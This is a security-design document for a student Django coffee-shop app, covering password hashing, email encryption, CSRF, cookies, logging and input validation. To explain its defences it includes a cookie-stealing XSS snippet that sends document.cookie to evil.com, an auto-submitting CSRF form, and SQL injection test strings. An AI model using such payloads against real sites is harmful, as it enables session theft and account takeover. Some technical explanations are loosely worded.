# Security Implementation

## What It Is

The Brews & Chews security implementation follows defense-in-depth principles with multiple layers of protection. It includes password hashing, email encryption, CSRF protection, session security, audit logging, and input validation to protect user data and prevent common web application vulnerabilities.

## Security Layers Overview

```
┌─────────────────────────────────────────────┐
│         Application Security Layers          │
├─────────────────────────────────────────────┤
│ 1. Input Validation (Form/URL/Headers)      │
│ 2. CSRF Protection (Token Validation)       │
│ 3. Session Security (HttpOnly, SameSite)    │
│ 4. Password Hashing (Argon2)                │
│ 5. Email Encryption (AES-256-GCM)           │
│ 6. Audit Logging (Authentication Events)    │
│ 7. Generic Error Messages (No Info Leak)    │
│ 8. Database Constraints (Uniqueness)        │
└─────────────────────────────────────────────┘
```

## 1. Password Security

### Password Hashing with Argon2

**What**: Passwords are hashed using Argon2id, the winner of the 2015 Password Hashing Competition.

**Configuration** (`brewschews/settings.py:282`):
```python
PASSWORD_HASHERS = [
    "django.contrib.auth.hashers.Argon2PasswordHasher",  # Primary
    "django.contrib.auth.hashers.PBKDF2PasswordHasher",  # Fallback
    # ... other fallbacks
]
```

**Argon2 Parameters**:
- **Algorithm**: Argon2id (hybrid mode)
- **Version**: 19 (latest)
- **Memory**: 102,400 KB (~100 MB)
- **Iterations**: 2 (time cost)
- **Parallelism**: 8 threads
- **Salt**: 16 bytes (auto-generated, unique per password)

**Hash Format**:
```
argon2$argon2id$v=19$m=102400,t=2,p=8$[salt]$[hash]
├─────┘ └──────┘ └┬┘ └─────────────┘ └──┬──┘ └─┬─┘
algorithm variant ver   parameters      salt   hash
```

**Why Argon2?**
- Memory-hard: Requires 100 MB RAM per hash (expensive for GPU attacks)
- Time-hard: ~0.5 seconds per hash (prevents brute force)
- Side-channel resistant: Protects against timing attacks
- Industry standard: Used by Microsoft, 1Password, Bitwarden
- OWASP recommended

**Implementation** (`accounts/models.py:59`):
```python
# Hashing on user creation
user.set_password(password)  # Automatically uses Argon2
user.save()

# Verification on login
if user.check_password(password):  # Constant-time comparison
    login(request, user)
```

**Security Guarantees**:
- Passwords never stored in plaintext
- Rainbow table attacks: Ineffective (unique salt per password)
- Brute force attacks: Impractical (0.5s per attempt, high memory cost)
- Timing attacks: Prevented (constant-time comparison)

### Password Validation Rules

**Django Built-in Validators** (`brewschews/settings.py:339`):

1. **UserAttributeSimilarityValidator**
   - Prevents password too similar to username/email
   - Example: `username="john"` + `password="john123"` → Rejected

2. **MinimumLengthValidator** (12 characters)
   - Requires at least 12 characters
   - More secure than default 8 characters

3. **CommonPasswordValidator**
   - Prevents ~20,000 most common passwords
   - Example: "password", "123456", "qwerty" → Rejected

4. **NumericPasswordValidator**
   - Prevents entirely numeric passwords
   - Example: "12345678901234" → Rejected

**Custom Validators** (`accounts/forms.py:122`):

```python
def _validate_password_strength(self, password: str) -> None:
    errors = []

    if len(password) < 12:
        errors.append("Password must be at least 12 characters long.")

    if password.lower() == password:  # No uppercase
        errors.append("Include at least one uppercase letter.")

    if not any(ch.isdigit() for ch in password):  # No number
        errors.append("Include at least one number.")

    if not PASSWORD_SPECIAL_PATTERN.search(password):  # No special char
        errors.append("Include at least one special character (!@#$%^&*).")
```

**Combined Requirements**:
- ✓ 12+ characters
- ✓ At least one uppercase letter (A-Z)
- ✓ At least one number (0-9)
- ✓ At least one special character (!@#$%^&*)
- ✓ Not similar to username/email
- ✓ Not in common password list
- ✓ Not entirely numeric

**Example Valid Password**: `CoffeeTime2024!`

**Code References**:
- Settings: `brewschews/settings.py:339`
- Custom validation: `accounts/forms.py:122`
- Hashing: `accounts/models.py:59`

## 2. Email Encryption (PII Protection)

### AES-256-GCM Encryption

**What**: User email addresses are encrypted at rest using AES-256-GCM for PII (Personally Identifiable Information) protection. This is an academic demonstration for MCO 1.

**Algorithm Details**:
- **Cipher**: AES (Advanced Encryption Standard)
- **Key Size**: 256 bits (32 bytes)
- **Mode**: GCM (Galois/Counter Mode)
- **Authentication**: Built-in authentication tag (prevents tampering)
- **Nonce**: 96 bits (12 bytes), unique per encryption

**Why AES-256-GCM?**
- AES-256: NIST approved, industry standard, unbroken
- GCM mode: Provides both confidentiality AND authenticity
- Authentication tag: Detects tampering or corruption
- Fast: Hardware-accelerated on modern CPUs
- Secure: Used by TLS, IPsec, banking systems

**Encryption Process** (`accounts/encryption.py:88`):

```python
def encrypt_email(email: str) -> bytes:
    # 1. Normalize email
    normalized = email.lower().strip()  # "alice@example.com"

    # 2. Generate unique nonce (NEVER reuse!)
    nonce = os.urandom(12)  # 96 bits

    # 3. Encrypt with AES-256-GCM
    aesgcm = AESGCM(key)  # 256-bit key from settings
    ciphertext = aesgcm.encrypt(nonce, normalized.encode('utf-8'), None)

    # 4. Return [nonce + ciphertext + auth_tag]
    return nonce + ciphertext
```

**Storage Format**:
```
[12 bytes nonce][variable ciphertext][16 bytes auth tag]
└─────┬─────┘  └────────┬────────┘ └──────┬───────┘
  Random IV    Encrypted email    Tamper detection
```

**Decryption Process** (`accounts/encryption.py:158`):

```python
def decrypt_email(encrypted_data: bytes) -> str:
    # 1. Extract nonce (first 12 bytes)
    nonce = encrypted_data[:12]

    # 2. Extract ciphertext + tag (remaining bytes)
    ciphertext = encrypted_data[12:]

    # 3. Decrypt and verify authentication tag
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    # 4. Return decrypted email
    return plaintext.decode('utf-8')
```

### Email Digest for Lookups

**Problem**: Can't query encrypted data directly.

**Solution**: SHA-256 digest (deterministic hash) for lookups.

**Process** (`accounts/encryption.py:220`):
```python
def generate_email_digest(email: str) -> str:
    normalized = email.lower().strip()
    return hashlib.sha256(normalized.encode('utf-8')).hexdigest()
```

**Example**:
```
Email: alice@example.com
Digest: b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514

Email: ALICE@EXAMPLE.COM  (different case)
Digest: b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514  (same!)
```

**Usage**:
- **Uniqueness**: Database has `UNIQUE` constraint on `email_digest`
- **Lookups**: `User.objects.filter(email_digest=digest)` (no decryption needed)
- **Case-insensitive**: Email normalized before hashing

**Security Properties**:
- One-way: Can't reverse digest to get email
- Deterministic: Same email → same digest
- Collision-resistant: Extremely unlikely two emails have same digest

### Key Management

**Key Storage** (`brewschews/settings.py:173`):
```python
# Get from environment variable
ACCOUNT_EMAIL_ENCRYPTION_KEY = os.environ.get(
    "ACCOUNT_EMAIL_ENCRYPTION_KEY",
    _derive_default_account_key(SECRET_KEY)  # Fallback for dev
)
```

**Production Requirements**:
- Store key in environment variable (never commit to git)
- Use different keys for dev/staging/production
- Back up key securely (if lost, emails can't be decrypted!)
- Rotate keys periodically (requires re-encryption)

**Key Generation**:
```bash
python -c "from accounts.encryption import generate_encryption_key; print(generate_encryption_key())"
```

**Code References**:
- Encryption: `accounts/encryption.py:88`
- Decryption: `accounts/encryption.py:158`
- Digest: `accounts/encryption.py:220`
- Key management: `brewschews/settings.py:173`
- Model integration: `accounts/models.py:128`

## 3. CSRF Protection

### Cross-Site Request Forgery Prevention

**What**: CSRF protection prevents malicious websites from submitting forms on behalf of authenticated users.

**How It Works**:

1. **Token Generation**: Server generates secret token for each session
2. **Token Embedding**: Token included in every form (hidden field)
3. **Token Validation**: Server validates token on POST requests
4. **Token Rejection**: Requests without valid token are rejected (403 Forbidden)

**Implementation** (`brewschews/settings.py:127`):
```python
MIDDLEWARE = [
    # ...
    "django.middleware.csrf.CsrfViewMiddleware",  # CSRF protection
    # ...
]
```

**Template Usage**:
```django
<form method="post">
    {% csrf_token %}  <!-- Inserts hidden field with token -->
    <input type="text" name="username">
    <button type="submit">Submit</button>
</form>
```

**Rendered HTML**:
```html
<form method="post">
    <input type="hidden" name="csrfmiddlewaretoken" value="abc123...xyz">
    <input type="text" name="username">
    <button type="submit">Submit</button>
</form>
```

**Attack Prevention**:

**Without CSRF protection** (VULNERABLE):
```
1. User logs into brewschews.com
2. User visits evil.com (while still logged in)
3. evil.com contains:
   <form action="https://brewschews.com/accounts/profile/delete" method="post">
       <input type="hidden" name="confirm" value="yes">
   </form>
   <script>document.forms[0].submit()</script>
4. User's account deleted! (using their session cookie)
```

**With CSRF protection** (SECURE):
```
1-3. Same as above
4. POST to brewschews.com without valid token
5. Server rejects with 403 Forbidden
6. Account safe!
```

**Cookie Settings** (`brewschews/settings.py:425`):
```python
CSRF_COOKIE_HTTPONLY = True     # JavaScript can't read CSRF token
CSRF_COOKIE_SAMESITE = 'Lax'    # Don't send cookie on cross-site requests
```

**Code References**:
- Middleware: `brewschews/settings.py:127`
- Cookie settings: `brewschews/settings.py:425`

## 4. Session Security

### Secure Session Management

**Session Configuration** (`brewschews/settings.py:424`):
```python
SESSION_COOKIE_HTTPONLY = True  # Prevent JavaScript from reading session cookie
SESSION_COOKIE_SAMESITE = 'Lax'  # Prevent CSRF via cross-site requests
```

**What Each Setting Does**:

**HttpOnly Flag**:
- Cookie marked as HttpOnly
- JavaScript can't access cookie via `document.cookie`
- Prevents XSS attacks from stealing session tokens

**Example XSS Attack (Prevented by HttpOnly)**:
```javascript
// Attacker injects this script
<script>
    // Try to steal session cookie
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// With HttpOnly: document.cookie returns empty (session cookie hidden)
// Without HttpOnly: document.cookie returns "sessionid=abc123..." (STOLEN!)
```

**SameSite Flag** (`Lax`):
- Cookie not sent on cross-site POST requests
- Cookie sent on top-level navigation (clicking links)
- Provides CSRF protection (defense-in-depth)

**SameSite Modes**:
- `Strict`: Never send cookie on cross-site requests (most secure, but breaks some workflows)
- `Lax`: Send cookie on safe cross-site requests (GET, HEAD) but not POST
- `None`: Always send cookie (requires Secure flag, HTTPS only)

**Production HTTPS Settings** (commented out in settings.py):
```python
# Uncomment for production with HTTPS:
if not DEBUG:
    SESSION_COOKIE_SECURE = True  # Only send cookie over HTTPS
    CSRF_COOKIE_SECURE = True     # Only send CSRF cookie over HTTPS
```

**Session Lifecycle**:

1. **Login**: `login(request, user)` creates session
   - Session ID generated (cryptographically random)
   - Session data stored server-side (database)
   - Session ID sent in cookie to browser

2. **Subsequent Requests**: Browser sends session cookie
   - Middleware reads cookie, loads user from session
   - `request.user` populated with User object

3. **Logout**: `logout(request)` destroys session
   - Session data deleted from database
   - Cookie deleted from browser

**Code References**:
- Session settings: `brewschews/settings.py:424`
- Session middleware: `brewschews/settings.py:124`

## 5. Audit Logging

### Authentication Event Tracking

**What**: All authentication attempts (signup, login) are logged for security monitoring and forensics.

**Model** (`accounts/models.py:262`):
```python
class AuthenticationEvent(models.Model):
    event_type = models.CharField(choices=['signup', 'login'])
    ip_address = models.GenericIPAddressField()  # IPv4 or IPv6
    username_submitted = models.CharField()
    email_submitted = models.EmailField()
    user = models.ForeignKey(User, null=True)  # Link if found
    successful = models.BooleanField()
    user_agent = models.CharField()  # Browser/device info
    metadata = models.JSONField()    # Extra data
    created_at = models.DateTimeField(auto_now_add=True)
```

**Logging Implementation** (`accounts/views.py:30`):
```python
def _record_event(*, event_type, ip_address, user_agent, username, user, successful):
    try:
        AuthenticationEvent.objects.create(
            event_type=event_type,
            ip_address=ip_address,
            user_agent=user_agent[:255],
            username_submitted=username,
            user=user,
            successful=successful,
        )
    except DatabaseError:
        logger.exception("Unable to persist authentication audit event")
        # Don't fail the request if logging fails
```

**When Logged**:

1. **Signup Attempt** (`accounts/views.py:143`):
   - Success: After user created, before redirect
   - Failure: After form validation fails

2. **Login Attempt** (`accounts/views.py:87`):
   - Success: After password verified, before redirect
   - Failure: After user not found or wrong password

**Captured Information**:
- Event type (signup or login)
- IP address (for detecting distributed attacks)
- User agent (browser/device fingerprinting)
- Username/email submitted (even if wrong)
- Link to User object (if found)
- Success/failure flag
- Timestamp (for time-based analysis)

**Use Cases**:

**1. Detect Brute Force Attacks**:
```python
# Check for multiple failed logins from same IP
from django.utils import timezone
from datetime import timedelta

recent = timezone.now() - timedelta(minutes=15)
failed_attempts = AuthenticationEvent.objects.filter(
    ip_address='192.168.1.100',
    event_type='login',
    successful=False,
    created_at__gte=recent
).count()

if failed_attempts >= 5:
    # Block IP or show CAPTCHA
    pass
```

**2. User Login History**:
```python
# Show user their recent logins
user.authentication_events.filter(
    event_type='login',
    successful=True
).order_by('-created_at')[:10]
```

**3. Investigate Unauthorized Access**:
```python
# Find all failed login attempts for compromised account
User.objects.get(username='alice').authentication_events.filter(
    successful=False,
    created_at__gte=compromise_date
)
```

**4. Compliance & Auditing**:
- GDPR: Right to access personal data (login history)
- PCI DSS: Audit trail requirements
- SOC 2: Access monitoring

**Database Optimization** (`accounts/models.py:309`):
```python
class Meta:
    indexes = [
        # Composite index for rate limiting queries
        models.Index(fields=["event_type", "ip_address", "created_at"]),
    ]
```

**Code References**:
- Model: `accounts/models.py:262`
- Logging function: `accounts/views.py:30`
- Signup logging: `accounts/views.py:143`
- Login logging: `accounts/views.py:87`

## 6. Input Validation & Sanitization

### Form Validation

**Server-Side Validation** (Always runs, trusted):

**Username** (`accounts/forms.py:45`):
```python
def clean_username(self):
    username = self.cleaned_data["username"].strip()

    # Pattern validation: 3-30 chars, alphanumeric with ._-
    if not USERNAME_PATTERN.match(username):
        raise ValidationError("Invalid format")

    # Uniqueness check
    if User.objects.filter(username__iexact=username).exists():
        raise ValidationError("Username taken")

    return username
```

**Email** (`accounts/forms.py:65`):
```python
def clean_email(self):
    email = self.cleaned_data["email"].strip().lower()

    # Generate digest for uniqueness check
    digest = generate_email_digest(email)
    if User.objects.filter(email_digest=digest).exists():
        raise ValidationError("Email already registered")

    return email
```

**Password** (`accounts/forms.py:99`):
```python
def clean(self):
    password = data.get("password", "")

    # Django built-in validators
    password_validation.validate_password(password)

    # Custom strength requirements
    self._validate_password_strength(password)

    return data
```

**Client-Side Validation** (UX enhancement only, not security):
- JavaScript validation in `static/js/auth.js`
- Provides immediate feedback (before server request)
- Server-side validation is authoritative (client-side can be bypassed)

### SQL Injection Prevention

**Django ORM**: Automatically escapes queries (prevents SQL injection).

**Safe** (Using ORM):
```python
# User input: username = "alice'; DROP TABLE users; --"
user = User.objects.filter(username=username).first()

# Generated SQL (escaped):
# SELECT * FROM users WHERE username = 'alice\'; DROP TABLE users; --'
# Treats entire input as string value (not SQL command)
```

**Unsafe** (Raw SQL without escaping):
```python
# DON'T DO THIS!
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
# SQL injection possible!
```

**If raw SQL needed** (rare), use parameterized queries:
```python
# Safe: Parameters escaped automatically
cursor.execute("SELECT * FROM users WHERE username = %s", [username])
```

### XSS Prevention

**Django Templates**: Auto-escape HTML by default.

**Template Auto-Escaping**:
```django
{# User input: <script>alert('XSS')</script> #}
<p>{{ user_input }}</p>

{# Rendered HTML (escaped): #}
<p>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</p>
{# Browser shows: <script>alert('XSS')</script> (as text, not executed) #}
```

**Disabling Auto-Escape** (dangerous, avoid):
```django
{# Only if you trust the input! #}
{{ user_input|safe }}
```

**Content Security Policy** (not currently implemented, future enhancement):
```python
# Restrict where scripts can be loaded from
SECURE_CONTENT_SECURITY_POLICY = "script-src 'self'"
```

### Generic Error Messages

**Prevent Information Disclosure**:

**Bad** (reveals if username exists):
```python
if user is None:
    return "User not found"
elif not user.check_password(password):
    return "Incorrect password"
```

**Good** (generic message):
```python
if user is None or not user.check_password(password):
    return "Invalid username or password"  # Same for both
```

**Why**: Prevents username enumeration attacks (attacker can't determine which usernames exist).

**Code Reference**: `accounts/views.py:86`

## 7. Database Security

### Encryption at Rest

**Current**: SQLite file on disk (unencrypted, suitable for development)

**Production Recommendation**:
- Full disk encryption (LUKS, BitLocker)
- Database-level encryption (PostgreSQL, MySQL support)
- Cloud encryption (AWS RDS, Google Cloud SQL)

### Access Control

**Current**: Application has full database access

**Production Best Practices**:
- Separate database users for different apps
- Read-only user for reporting queries
- Principle of least privilege
- Firewall rules (restrict database port access)

### Database Constraints

**Security via Constraints**:

1. **Unique Constraints**: Prevent duplicate usernames/emails
2. **Foreign Key Constraints**: Maintain referential integrity
3. **Check Constraints**: Enforce business rules at database level
4. **Not Null Constraints**: Prevent missing critical data

**Example** (`accounts/models.py`):
```python
username = models.CharField(unique=True)  # Can't have duplicate usernames
email_digest = models.CharField(unique=True)  # Can't register same email twice
```

## Security Testing

### Manual Security Tests

**Test 1: SQL Injection**
```python
# Try injecting SQL in username field
username = "admin' OR '1'='1"
# Expected: Treated as literal string, no SQL execution
```

**Test 2: XSS Attack**
```python
# Try injecting script in profile bio
bio = "<script>alert('XSS')</script>"
# Expected: Displayed as text, not executed
```

**Test 3: CSRF Attack**
```
1. Log in to Brews & Chews
2. Visit attacker website with hidden form
3. Form auto-submits to Brews & Chews
Expected: 403 Forbidden (CSRF token missing)
```

**Test 4: Session Hijacking**
```
1. Log in, get session cookie
2. Close browser, delete cookie
3. Manually add old cookie back
Expected: Still logged in (session persists server-side)
```

**Test 5: Password Strength**
```
Try weak passwords:
- "password" → Rejected (too common)
- "12345678901234" → Rejected (entirely numeric)
- "longpassword" → Rejected (no uppercase/number/special)
Expected: All rejected with specific error messages
```

### Automated Security Tests

**Run tests**:
```bash
python manage.py test accounts.tests
```

**Test Coverage** (`accounts/tests.py`):
- Password validation
- Email encryption
- Form validation
- CSRF protection
- Session management
- Audit logging

### Security Checklist

**Authentication**:
- ✓ Passwords hashed with Argon2
- ✓ Strong password requirements enforced
- ✓ Generic error messages (no info leak)
- ✓ Audit logging for all attempts

**Session Management**:
- ✓ HttpOnly cookies (XSS protection)
- ✓ SameSite=Lax (CSRF protection)
- ✓ Secure logout (session destroyed)
- ✓ Session timeout (future: implement)

**Data Protection**:
- ✓ Email encryption (AES-256-GCM)
- ✓ Password hashing (Argon2)
- ✓ HTTPS enforcement (future: production)
- ✓ Database backups (future: implement)

**Input Validation**:
- ✓ Server-side validation (authoritative)
- ✓ SQL injection prevention (ORM escaping)
- ✓ XSS prevention (template auto-escape)
- ✓ CSRF protection (token validation)

**Audit & Monitoring**:
- ✓ Authentication event logging
- ✓ IP address tracking
- ✓ Failed attempt monitoring
- ✓ Rate limiting (future: re-implement)

## Security Best Practices Followed

1. **Defense in Depth**: Multiple security layers
2. **Least Privilege**: Users have minimal necessary permissions
3. **Secure by Default**: Security features enabled out of the box
4. **Fail Securely**: Errors don't reveal sensitive information
5. **Audit Logging**: All security events tracked
6. **Input Validation**: Never trust user input
7. **Encryption**: Sensitive data encrypted at rest
8. **Strong Cryptography**: Industry-standard algorithms (Argon2, AES-256-GCM)

## Common Security Issues & Mitigations

### Issue 1: Brute Force Attacks

**Attack**: Trying many passwords for one account.

**Mitigations**:
- Slow password hashing (Argon2, ~0.5s per attempt)
- Audit logging (detect pattern of failures)
- Future: Rate limiting, account lockout, CAPTCHA

### Issue 2: Credential Stuffing

**Attack**: Using leaked credentials from other sites.

**Mitigations**:
- Strong password requirements (prevent reuse of weak passwords)
- Email encryption (limits damage if database leaked)
- Future: Breach detection, forced password reset

### Issue 3: Session Hijacking

**Attack**: Stealing session cookie to impersonate user.

**Mitigations**:
- HttpOnly cookies (JavaScript can't access)
- SameSite=Lax (cross-site requests blocked)
- Future: Session fingerprinting, IP binding

### Issue 4: Man-in-the-Middle

**Attack**: Intercepting traffic between user and server.

**Mitigations**:
- HTTPS (future: production deployment)
- Secure cookie flag (requires HTTPS)
- HSTS header (force HTTPS)

### Issue 5: Insider Threats

**Attack**: Database administrator accessing user data.

**Mitigations**:
- Email encryption (can't read emails without key)
- Password hashing (can't read passwords, ever)
- Audit logging (track database access)
- Key management (separate from database)

## Security Compliance

**OWASP Top 10 (2021) Coverage**:
- ✓ A01: Broken Access Control → Session management, @login_required
- ✓ A02: Cryptographic Failures → Argon2, AES-256-GCM
- ✓ A03: Injection → ORM escaping, template auto-escape
- ✓ A04: Insecure Design → Defense in depth
- ✓ A05: Security Misconfiguration → Secure defaults
- ✓ A06: Vulnerable Components → Regular updates
- ✓ A07: Authentication Failures → Strong hashing, audit logs
- ✓ A08: Software & Data Integrity → CSRF protection
- ✓ A09: Logging & Monitoring → AuthenticationEvent model
- ✓ A10: SSRF → PayMongo API calls validated

**Payment Security (PCI DSS Compliance)**:
- Card data never touches server (PayMongo hosted checkout)
- Webhook signatures verified (HMAC-SHA256)
- API keys stored as environment variables
- HTTPS-only API communication

**GDPR (General Data Protection Regulation)**:
- ✓ Email encryption (data protection)
- ✓ Audit logs (right to access)
- ✓ Account deletion capability (right to be forgotten)

## Code References Summary

| Security Feature | File:Line | Description |
|-----------------|-----------|-------------|
| Password Hashers | `brewschews/settings.py:282` | Argon2 configuration |
| Password Validators | `brewschews/settings.py:339` | Strength requirements |
| Email Encryption | `accounts/encryption.py:88` | AES-256-GCM implementation |
| CSRF Middleware | `brewschews/settings.py:127` | Token validation |
| Session Security | `brewschews/settings.py:424` | HttpOnly, SameSite |
| Audit Logging | `accounts/views.py:30` | Event recording |
| Form Validation | `accounts/forms.py:45` | Input sanitization |
| Generic Errors | `accounts/views.py:86` | No info disclosure |
| Webhook Verification | `orders/payments.py:224` | HMAC-SHA256 signature check |
| Order Ownership | `orders/views.py:788` | User verification for orders |
| PayMongo API | `orders/payments.py:89` | Secure API communication |
